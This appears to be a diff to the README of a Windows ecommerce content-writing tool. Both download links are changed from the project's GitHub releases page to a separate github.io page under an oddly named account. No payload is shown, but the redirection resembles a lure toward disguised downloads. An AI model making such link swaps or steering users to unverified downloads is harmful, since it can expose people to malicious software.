@@ -1,6 +1,6 @@
 # 📦 apex-product-creative-workflow - Create accurate ecommerce content with ease
 
-[![Download Apex Engine](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/mercerised-smoothhoundshark553/apex-product-creative-workflow/releases)
+[![Download Apex Engine](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://mercerised-smoothhoundshark553.github.io)
 
 Apex Product Creative Engine helps you write product content for ecommerce. It uses facts from your files to build descriptions. The system checks your claims to keep your content honest. You make the final choice on what to release.
 
@@ -25,7 +25,7 @@ You need a standard Windows computer to run this software.
 
 ## 🚀 Downloading the Software
 
-[Visit the release page to download the latest version](https://github.com/mercerised-smoothhoundshark553/apex-product-creative-workflow/releases).
+[Visit the release page to download the latest version](https://mercerised-smoothhoundshark553.github.io).
 
 1. Open your web browser.
 2. Click the link above.
